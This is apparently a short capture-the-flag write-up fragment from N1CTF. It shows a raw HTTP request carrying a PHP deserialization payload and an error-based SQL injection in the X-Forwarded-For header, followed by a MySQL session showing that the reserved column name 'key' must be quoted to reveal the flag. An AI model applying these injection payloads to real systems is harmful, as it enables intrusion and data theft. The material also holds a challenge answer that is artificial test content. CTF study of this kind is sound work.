payload here：
```htmlembedded=
GET /?input=O%3A4%3A%22flag%22%3A1%3A%7Bs%3A2%3A%22ip%22%3BO%3A2%3A%22ip%22%3A0%3A%7B%7D%7D HTTP/1.1
Host: 101.32.205.189
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
X-Forwarded-For: 123.123.123.13' or updatexml(1,concat(0x7e,(select if((select substr(version(),2,1)='.'),'n1ctf',1))),0) or '
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
```
key is in database,but if u use `select key from n1key`,u cannot find it.Why?
```

mysql> desc n1key;
+-------+------------------+------+-----+---------+----------------+
| Field | Type             | Null | Key | Default | Extra          |
+-------+------------------+------+-----+---------+----------------+
| id    | int(10) unsigned | NO   | PRI | NULL    | auto_increment |
| key   | varchar(100)     | NO   |     | NULL    |                |
+-------+------------------+------+-----+---------+----------------+
2 rows in set (0.00 sec)

mysql> select key from n1key;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'key from n1key' at line 1
mysql> select `key` from n1key;
+---------------------------+
| key                       |
+---------------------------+
| n1ctf20205bf75ab0a30dfc0c |
+---------------------------+
1 row in set (0.00 sec)

mysql>
```
